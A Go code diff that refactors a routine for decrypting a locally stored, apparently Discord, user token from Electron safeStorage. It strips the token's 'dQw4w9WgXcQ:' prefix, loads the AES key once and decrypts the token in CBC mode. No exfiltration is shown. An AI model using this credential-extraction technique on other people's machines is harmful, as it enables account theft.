@@ -34,14 +34,20 @@ func GetToken() (string, error) {
 		safeTokens, err := getSafeStorageTokens(path)
 		if err != nil {
 			// try another database
-			log.Debug(err)
+			log.Error(err)
+			continue
+		}
+
+		key, err := getDecryptionKey()
+		if err != nil {
+			log.Error(err)
 			continue
 		}
 
 		for _, safeToken := range safeTokens {
 			// strip rickroll
 			safeToken := strings.TrimPrefix(safeToken, "dQw4w9WgXcQ:")
-			token, err := decryptToken(safeToken)
+			token, err := decryptToken(key, safeToken)
 			if err != nil {
 				// try next token
 				log.Error(err)
@@ -74,24 +80,19 @@ func getDecryptionKey() ([]byte, error) {
 	return key, nil
 }
 
-func decryptToken(safeToken string) (string, error) {
+func decryptToken(key []byte, safeToken string) (string, error) {
 	safeTokenBytes, err := base64.StdEncoding.DecodeString(safeToken)
 	if err != nil {
-		return "", fmt.Errorf("token: error decoding safeStorage token")
+		return "", fmt.Errorf("token: error decoding safeStorage token: %w", err)
 	}
 
-	decryptionKey, err := getDecryptionKey()
-	if err != nil {
-		return "", err
-	}
-
-	block, err := aes.NewCipher(decryptionKey)
+	block, err := aes.NewCipher(key)
 	if err != nil {
 		return "", err
 	}
 
 	iv := bytes.Repeat([]byte{' '}, 16)
-	ciphertext := safeTokenBytes[3:]
+	ciphertext := safeTokenBytes[len(v10Prefix):]
 
 	cbc := cipher.NewCBCDecrypter(block, iv)
 	cbc.CryptBlocks(ciphertext, ciphertext)
